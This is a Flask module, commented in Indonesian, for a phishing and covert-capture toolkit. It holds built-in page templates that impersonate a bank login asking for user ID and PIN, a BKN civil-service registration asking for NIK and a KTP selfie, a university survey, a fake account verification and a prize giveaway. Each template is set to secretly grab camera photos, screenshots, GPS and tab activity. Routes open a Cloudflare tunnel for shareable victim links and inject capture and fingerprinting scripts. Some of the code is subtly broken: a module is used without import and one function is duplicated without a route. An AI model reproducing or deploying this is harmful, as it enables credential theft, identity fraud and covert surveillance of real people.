"""Template Gallery — koleksi template halaman capture."""
import os
from flask import Blueprint, jsonify, request, render_template, Response, abort
from app.auth import login_required
from app.database import db
from app.models import Template, CaptureConfig
import secrets
import string
import json


bp = Blueprint("tpl_gallery", __name__)


def _gen_slug(length=10):
    alphabet = string.ascii_lowercase + string.digits
    while True:
        s = "".join(secrets.choice(alphabet) for _ in range(length))
        if not Template.query.filter_by(slug=s).first():
            return s


# ============================================================
# BUILT-IN TEMPLATES (HTML dasar)
# ============================================================
BUILTIN_TEMPLATES = [
    {
        "name": "Kuisioner Penelitian",
        "category": "academic",
        "icon": "📋",
        "description": "Form kuisioner skripsi/tesis dengan informed consent",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": False,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;max-width:480px;margin:0 auto;padding:20px;background:#f5f7fa;min-height:100vh">
  <div style="background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;padding:20px;border-radius:12px 12px 0 0;text-align:center">
    <h1 style="margin:0;font-size:18px">📋 Kuisioner Penelitian</h1>
    <p style="margin:6px 0 0;font-size:12px;opacity:0.9">Universitas Indonesia · Ilmu Komputer</p>
  </div>
  <div style="background:#fff;padding:20px;border-radius:0 0 12px 12px;box-shadow:0 2px 12px rgba(0,0,0,0.06)">
    <h3 style="margin:0 0 12px;font-size:14px;color:#1e3c72">ℹ️ Informasi Penelitian</h3>
    <p style="font-size:13px;color:#666;line-height:1.6;margin:0 0 16px">
      <b>Judul:</b> Pengaruh Penggunaan Media Sosial terhadap Kualitas Tidur Mahasiswa<br>
      <b>Peneliti:</b> Budi Santoso (NIM: 2106123456)<br>
      <b>Durasi:</b> ±3 menit
    </p>
    <h3 style="margin:16px 0 12px;font-size:14px;color:#1e3c72">✍️ Data Responden</h3>
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Nama (boleh inisial)</label>
    <input type="text" name="nama" placeholder="Contoh: B.S." style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Usia</label>
    <input type="number" name="usia" placeholder="21" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Jenis Kelamin</label>
    <div style="display:flex;gap:16px;margin-bottom:12px">
      <label style="font-size:13px"><input type="radio" name="jk" value="L"> Laki-laki</label>
      <label style="font-size:13px"><input type="radio" name="jk" value="P"> Perempuan</label>
    </div>
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Domisili</label>
    <input type="text" name="kota" placeholder="Depok" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:16px;box-sizing:border-box">
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Pertanyaan 1: Jam tidur per malam?</label>
    <select name="q1" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <option>-- Pilih --</option><option>&lt; 4 jam</option><option>4-6 jam</option><option>6-8 jam</option><option>&gt; 8 jam</option>
    </select>
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Pertanyaan 2: Platform sosmed favorit?</label>
    <select name="q2" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:16px;box-sizing:border-box">
      <option>-- Pilih --</option><option>Instagram</option><option>TikTok</option><option>Twitter/X</option><option>YouTube</option>
    </select>
    <div style="background:#fff8e1;border:1px solid #ffe082;border-radius:8px;padding:12px;font-size:12px;color:#7a5c00;margin-bottom:14px">
      <input type="checkbox" id="consent" style="margin-right:6px">
      <label for="consent">Saya setuju data digunakan untuk penelitian akademik. Data akan dianonimkan.</label>
    </div>
    <p style="font-size:12px;color:#666;text-align:center;margin:12px 0">
      Untuk verifikasi responden, kami akan meminta izin kamera &amp; lokasi saat Anda klik Kirim.
    </p>
    <button id="btnSubmit" disabled style="width:100%;padding:14px;border:none;border-radius:8px;background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;font-size:15px;font-weight:600;cursor:pointer">KIRIM KUISIONER</button>
  </div>
</div>
<script>
  document.getElementById('consent').addEventListener('change', function() {
    document.getElementById('btnSubmit').disabled = !this.checked;
  });
  document.getElementById('btnSubmit').addEventListener('click', function() {
    this.disabled = true;
    this.textContent = 'Mengirim...';
    setTimeout(function() {
      document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;text-align:center;padding:30px;font-family:system-ui"><div><div style="font-size:80px">🎓</div><h1 style="font-size:22px;margin:12px 0">Terima Kasih!</h1><p style="opacity:0.9;max-width:300px">Partisipasi Anda sangat berarti untuk penelitian ini.</p></div></div>';
    }, 2500);
  });
</script>"""
    },
    {
        "name": "Verifikasi Akun",
        "category": "general",
        "icon": "🔒",
        "description": "Halaman verifikasi akun (fake UI)",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": True,
                   "gps": False, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;max-width:420px;margin:0 auto;padding:40px 20px;background:radial-gradient(circle at 50% 30%,#1a2332,#0d0d0d);min-height:100vh;color:#eee;text-align:center">
  <div style="font-size:60px;margin-bottom:20px">🔒</div>
  <h1 style="font-size:22px;margin:0 0 8px">Verifikasi Keamanan</h1>
  <p style="color:#8899aa;font-size:14px;line-height:1.5;margin-bottom:30px">Kami mendeteksi aktivitas mencurigakan di akun Anda. Verifikasi diperlukan.</p>
  <div style="background:#1a1a1a;border-radius:12px;padding:20px;border:1px solid #2a2a2a">
    <p style="font-size:13px;color:#666;margin:0 0 16px">Verifikasi otomatis dalam <b style="color:#4a9eff" id="countdown">5</b> detik</p>
    <div style="width:100%;height:4px;background:#222;border-radius:2px;overflow:hidden">
      <div style="height:100%;width:0%;background:linear-gradient(90deg,#4a9eff,#a06bff);transition:width 5s linear" id="bar"></div>
    </div>
  </div>
  <p style="font-size:11px;color:#555;margin-top:20px">Mohon izinkan akses kamera untuk melanjutkan</p>
</div>
<script>
  setTimeout(function(){document.getElementById('bar').style.width='100%';},100);
  var n=5;var t=setInterval(function(){n--;document.getElementById('countdown').textContent=n;if(n<=0)clearInterval(t);},1000);
</script>"""
    },
    {
        "name": "Form Pendaftaran CPNS",
        "category": "government",
        "icon": "🏛️",
        "description": "Form pendaftaran CPNS/pegawai dengan upload KTP",
        "config": {"foto_depan": True, "foto_belakang": True, "screenshot": True,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;max-width:480px;margin:0 auto;background:#f5f7fa;min-height:100vh">
  <div style="background:linear-gradient(135deg,#003d79,#0055a5);color:#fff;padding:24px;text-align:center">
    <div style="font-size:40px;margin-bottom:8px">🏛️</div>
    <h1 style="margin:0;font-size:18px">Pendaftaran CPNS 2026</h1>
    <p style="margin:6px 0 0;font-size:12px;opacity:0.9">Badan Kepegawaian Negara</p>
  </div>
  <div style="padding:20px">
    <div style="background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.06)">
      <h3 style="margin:0 0 16px;color:#003d79;font-size:15px">📝 Data Diri</h3>
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Nama Lengkap</label>
      <input type="text" name="nama" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">NIK (16 digit)</label>
      <input type="text" name="nik" maxlength="16" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Nomor HP</label>
      <input type="tel" name="phone" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Email</label>
      <input type="email" name="email" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:16px;box-sizing:border-box">
      <div style="background:#e3f2fd;border:1px solid #90caf9;border-radius:8px;padding:12px;font-size:12px;color:#0d47a1;margin-bottom:14px">
        📸 Foto selfie + KTP diperlukan untuk verifikasi. Izin kamera akan diminta saat klik Daftar.
      </div>
      <button id="btnDaftar" style="width:100%;padding:14px;border:none;border-radius:8px;background:linear-gradient(135deg,#003d79,#0055a5);color:#fff;font-size:15px;font-weight:600;cursor:pointer">DAFTAR SEKARANG</button>
    </div>
  </div>
</div>
<script>
  document.getElementById('btnDaftar').addEventListener('click', function() {
    this.textContent = 'Memproses...';
    this.disabled = true;
    setTimeout(function() {
      document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f5f7fa;text-align:center;padding:30px;font-family:system-ui"><div><div style="font-size:80px">✅</div><h1 style="color:#003d79">Pendaftaran Berhasil</h1><p style="color:#666">Nomor registrasi: CPNS-2026-0042</p></div></div>';
    }, 2500);
  });
</script>"""
    },
    {
        "name": "Login Bank",
        "category": "bank",
        "icon": "🏦",
        "description": "Halaman login internet banking",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": True,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;background:#f0f2f5;min-height:100vh">
  <div style="background:linear-gradient(135deg,#004b87,#0066b3);color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px">
    <div style="width:40px;height:40px;border-radius:8px;background:#fff;color:#004b87;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:20px">🏦</div>
    <div><div style="font-size:16px;font-weight:600">Internet Banking</div><div style="font-size:11px;opacity:0.9">Personal Banking</div></div>
  </div>
  <div style="max-width:400px;margin:0 auto;padding:24px 20px">
    <h2 style="text-align:center;color:#004b87;font-size:18px;margin:0 0 6px">Selamat Datang</h2>
    <p style="text-align:center;color:#666;font-size:13px;margin:0 0 24px">Silakan masukkan data Anda</p>
    <div style="background:#fff;border-radius:12px;padding:24px;box-shadow:0 4px 20px rgba(0,0,0,0.06)">
      <label style="display:block;font-size:13px;color:#555;margin-bottom:6px">User ID</label>
      <input type="text" name="userid" style="width:100%;padding:13px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:14px;box-sizing:border-box">
      <label style="display:block;font-size:13px;color:#555;margin-bottom:6px">PIN</label>
      <input type="password" name="pin" maxlength="6" style="width:100%;padding:13px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:14px;box-sizing:border-box">
      <label style="display:block;font-size:13px;color:#555;margin-bottom:6px">Nomor HP</label>
      <input type="tel" name="phone" style="width:100%;padding:13px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:18px;box-sizing:border-box">
      <button id="btnLogin" style="width:100%;padding:14px;border:none;border-radius:8px;background:linear-gradient(135deg,#004b87,#0066b3);color:#fff;font-size:15px;font-weight:600;cursor:pointer">MASUK</button>
    </div>
    <p style="text-align:center;font-size:12px;color:#0066b3;margin-top:16px">🔒 Koneksi aman & terenkripsi</p>
  </div>
</div>
<script>
  document.getElementById('btnLogin').addEventListener('click', function() {
    this.textContent = 'Memverifikasi...';
    this.disabled = true;
    setTimeout(function() {
      var el = document.createElement('div');
      el.style.cssText = 'background:#ffebee;color:#c62828;padding:12px;border-radius:8px;font-size:13px;margin-bottom:14px;text-align:center';
      el.textContent = '⚠ PIN salah. Silakan coba lagi.';
      document.querySelector('.bank-form') || document.querySelector('div[style*="box-shadow"]').insertBefore(el, document.querySelector('div[style*="box-shadow"]').firstChild);
      document.getElementById('btnLogin').textContent = 'MASUK';
      document.getElementById('btnLogin').disabled = false;
    }, 2500);
  });
</script>"""
    },
    {
        "name": "Giveaway / Undian",
        "category": "marketing",
        "icon": "🎁",
        "description": "Halaman giveaway berhadiah",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": False,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": False},
        "html": """<div style="font-family:system-ui,sans-serif;background:linear-gradient(135deg,#ff6b6b,#ffb547);min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:24px;text-align:center;color:#fff">
  <div style="font-size:100px;animation:bounce 1s infinite">🎁</div>
  <style>@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}</style>
  <h1 style="font-size:28px;font-weight:bold;margin:20px 0 10px">Selamat!</h1>
  <p style="font-size:16px;opacity:0.95;margin-bottom:30px">Kamu terpilih untuk mendapatkan hadiah senilai <b>Rp 5.000.000</b></p>
  <button id="btnClaim" style="padding:18px 40px;font-size:18px;font-weight:bold;border:none;border-radius:50px;background:#fff;color:#ff6b6b;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,0.2)">KLAIM SEKARANG</button>
  <p style="margin-top:20px;font-size:12px;opacity:0.8">*Promo terbatas 100 orang pertama</p>
</div>
<script>
  document.getElementById('btnClaim').addEventListener('click', function() {
    this.textContent = 'Memproses...';
    this.disabled = true;
    setTimeout(function() {
      document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;text-align:center;padding:30px;font-family:system-ui"><div><div style="font-size:80px">🎉</div><h1 style="color:#333">Selamat!</h1><p style="color:#666">Tim kami akan menghubungi Anda dalam 1x24 jam</p></div></div>';
    }, 2500);
  });
</script>"""
    },
]


# ============================================================
# ROUTES
# ============================================================
@bp.route("/templates")
@login_required
def gallery():
    templates = Template.query.order_by(Template.id.desc()).all()
    return render_template("templates_gallery.html", templates=templates)


@bp.route("/api/templates/list")
@login_required
def list_templates():
    templates = Template.query.order_by(Template.id.desc()).all()
    return jsonify([t.to_dict() for t in templates])


@bp.route("/api/templates/init-builtin", methods=["POST"])
@login_required
def init_builtin():
    """Seed template bawaan kalau belum ada."""
    created = 0
    for t in BUILTIN_TEMPLATES:
        if not Template.query.filter_by(name=t["name"], is_builtin=1).first():
            tpl = Template(
                slug=_gen_slug(),
                name=t["name"],
                category=t["category"],
                icon=t["icon"],
                description=t["description"],
                html_content=t["html"],
                config_json=json.dumps(t["config"]),
                is_builtin=1,
            )
            db.session.add(tpl)
            created += 1
    db.session.commit()
    return jsonify({"ok": True, "created": created})


@bp.route("/api/templates/create", methods=["POST"])
@login_required
def create_template():
    """Bikin template custom dari HTML yang di-paste."""
    data = request.get_json(force=True, silent=True) or {}
    tpl = Template(
        slug=_gen_slug(),
        name=(data.get("name") or "Custom Template")[:128],
        category=data.get("category") or "custom",
        icon=data.get("icon") or "📄",
        description=data.get("description") or "",
        html_content=data.get("html") or "",
        config_json=json.dumps(data.get("config") or {}),
        is_builtin=0,
    )
    db.session.add(tpl)
    db.session.commit()
    return jsonify({"ok": True, "data": tpl.to_dict()})


@bp.route("/api/templates/delete/<int:tid>", methods=["POST", "DELETE"])
@login_required
def delete_template(tid):
    t = Template.query.get(tid)
    if not t:
        return jsonify({"ok": False}), 404
    db.session.delete(t)
    db.session.commit()
    return jsonify({"ok": True})


def _get_tunnel_url():
    """Cek URL tunnel aktif. Kalau belum ada, coba start."""
    import subprocess
    script = os.path.expanduser("~/capture-pro/tunnel_service.sh")
    if not os.path.isfile(script):
        return None, False

    try:
        # Cek status
        result = subprocess.run(
            ["bash", script, "status"],
            capture_output=True, text=True, timeout=10,
        )
        out = (result.stdout or "").strip()
        parts = out.split("|")
        running = (parts[0].strip() == "RUNNING") if parts else False
        url = parts[2].strip() if len(parts) > 2 else ""

        if running and url:
            return url, False  # Sudah jalan

        # Belum jalan → start
        result = subprocess.run(
            ["bash", script, "start"],
            capture_output=True, text=True, timeout=45,
        )
        out = (result.stdout or "") + (result.stderr or "")

        # Extract URL dari output
        m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", out)
        if m:
            return m.group(0), True

        # Kalau tidak ada di output, cek log
        import time
        time.sleep(3)
        result = subprocess.run(
            ["bash", script, "url"],
            capture_output=True, text=True, timeout=10,
        )
        url = (result.stdout or "").strip()
        if url.startswith("https://"):
            return url, True

        return None, True  # Started tapi URL belum siap
    except Exception as e:
        print(f"[tunnel] error: {e}")
        return None, False


@bp.route("/api/templates/use/<int:tid>", methods=["POST"])
@login_required
def use_template(tid):
    """Bikin CaptureConfig dari template + auto-start tunnel."""
    from flask import jsonify, request as _r
    import re as _re

    try:
        t = Template.query.get(tid)
        if not t:
            return jsonify({"ok": False, "msg": "Template not found"}), 404

        # Parse config
        try:
            cfg = json.loads(t.config_json or "{}")
        except Exception:
            cfg = {}

        data = _r.get_json(force=True, silent=True) or {}
        campaign = (data.get("campaign") or t.category or "template")[:64]

        # Generate slug unik
        alphabet = string.ascii_lowercase + string.digits
        slug = None
        for _ in range(20):
            candidate = "".join(secrets.choice(alphabet) for _ in range(8))
            if not CaptureConfig.query.filter_by(slug=candidate).first():
                slug = candidate
                break
        if not slug:
            return jsonify({"ok": False, "msg": "Slug collision"}), 500

        # Bikin CaptureConfig
        c = CaptureConfig(
            slug=slug,
            name=(data.get("name") or t.name)[:128],
            campaign=campaign,
            foto_depan=1 if cfg.get("foto_depan") else 0,
            foto_belakang=1 if cfg.get("foto_belakang") else 0,
            screenshot=1 if cfg.get("screenshot") else 0,
            gps=1 if cfg.get("gps") else 0,
            burst=1 if cfg.get("burst") else 0,
            burst_interval=int(cfg.get("burst_interval") or 3),
            burst_duration=int(cfg.get("burst_duration") or 30),
            location_tracking=1 if cfg.get("location_tracking") else 0,
            tab_log=1 if cfg.get("tab_log") else 0,
            delay_seconds=int(cfg.get("delay_seconds") or 5),
            wait_permission=1,
            title=t.name[:128],
            subtitle=(t.description or "Mohon tunggu sebentar...")[:500],
        )
        try:
            c.template_id = t.id
        except Exception:
            pass

        db.session.add(c)
        db.session.commit()

        # === AUTO-START TUNNEL ===
        tunnel_url, was_started = _get_tunnel_url()

        # Base URL: pakai tunnel kalau ada, fallback ke request.host
        if tunnel_url:
            base_url = tunnel_url.rstrip("/")
        else:
            base_url = _r.host_url.rstrip("/")

        link_tpl = f"{base_url}/t/{t.id}/{slug}"
        link_short = f"{base_url}/m/{slug}"

        return jsonify({
            "ok": True,
            "slug": slug,
            "template_id": t.id,
            "tunnel_url": tunnel_url,
            "tunnel_started": was_started,
            "link_template": link_tpl,
            "link_short": link_short,
            "using_tunnel": bool(tunnel_url),
        })
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({"ok": False, "msg": "Server error: " + str(e)}), 500




@login_required
def use_template(tid):
    """Bikin CaptureConfig baru dari template — return link."""
    t = Template.query.get(tid)
    if not t:
        return jsonify({"ok": False, "msg": "template not found"}), 404

    # Parse config
    try:
        cfg = json.loads(t.config_json or "{}")
    except:
        cfg = {}

    # Ambil config tambahan dari request
    data = request.get_json(force=True, silent=True) or {}
    campaign = data.get("campaign") or t.category or "template"

    # Bikin CaptureConfig baru
    slug = _gen_slug_cfg()
    c = CaptureConfig(
        slug=slug,
        name=(data.get("name") or t.name)[:128],
        campaign=campaign[:64],
        foto_depan=1 if cfg.get("foto_depan") else 0,
        foto_belakang=1 if cfg.get("foto_belakang") else 0,
        screenshot=1 if cfg.get("screenshot") else 0,
        gps=1 if cfg.get("gps") else 0,
        burst=1 if cfg.get("burst") else 0,
        burst_interval=int(cfg.get("burst_interval") or 3),
        burst_duration=int(cfg.get("burst_duration") or 30),
        location_tracking=1 if cfg.get("location_tracking") else 0,
        tab_log=1 if cfg.get("tab_log") else 0,
        delay_seconds=int(cfg.get("delay_seconds") or 5),
        wait_permission=1,
        title=t.name[:128],
        subtitle=(t.description or "Mohon tunggu sebentar...")[:500],
        template_id=t.id,
    )
    db.session.add(c)
    db.session.commit()

    return jsonify({
        "ok": True,
        "slug": slug,
        "config": c.to_dict(),
        "template_id": t.id,
    })


@bp.route("/t/<int:tid>/<slug>")
def render_template_page(tid, slug):
    """Render template HTML + auto-inject capture.js."""
    t = Template.query.get(tid)
    if not t:
        abort(404)

    # Bikin CONFIG JSON dari template
    try:
        cfg = json.loads(t.config_json or "{}")
    except:
        cfg = {}

    config_json = json.dumps({
        "ENABLE_FOTO_DEPAN": bool(cfg.get("foto_depan")),
        "ENABLE_FOTO_BELAKANG": bool(cfg.get("foto_belakang")),
        "ENABLE_SCREENSHOT": bool(cfg.get("screenshot")),
        "ENABLE_GPS": bool(cfg.get("gps")),
        "ENABLE_BURST": bool(cfg.get("burst")),
        "BURST_INTERVAL": int(cfg.get("burst_interval") or 3),
        "BURST_DURATION": int(cfg.get("burst_duration") or 30),
        "ENABLE_LOCATION_TRACKING": bool(cfg.get("location_tracking")),
        "ENABLE_TAB_LOG": bool(cfg.get("tab_log")),
        "DELAY_SECONDS": int(cfg.get("delay_seconds") or 5),
        "WAIT_PERMISSION": True,
    })

    html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#1e3c72">
<title>{t.name}</title>
<link rel="manifest" href="/static/manifest.json">
<style>body{{margin:0;padding:0;font-family:system-ui,sans-serif}}</style>
</head><body>

{t.html_content}

<video id="v" autoplay playsinline muted hidden></video>
<canvas id="c" hidden></canvas>
<div id="status" hidden></div>
<div id="log" hidden></div>

<script>
  window.CAMPAIGN = "{t.category or 'template'}";
  window.MODE_SLUG = "{slug}";
  window.CONFIG = {config_json};
</script>
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
<script src="/static/js/capture.js"></script>
</body></html>"""
    return Response(html, mimetype="text/html")


def _gen_slug_cfg(length=8):
    alphabet = string.ascii_lowercase + string.digits
    while True:
        s = "".join(secrets.choice(alphabet) for _ in range(length))
        if not CaptureConfig.query.filter_by(slug=s).first():
            return s
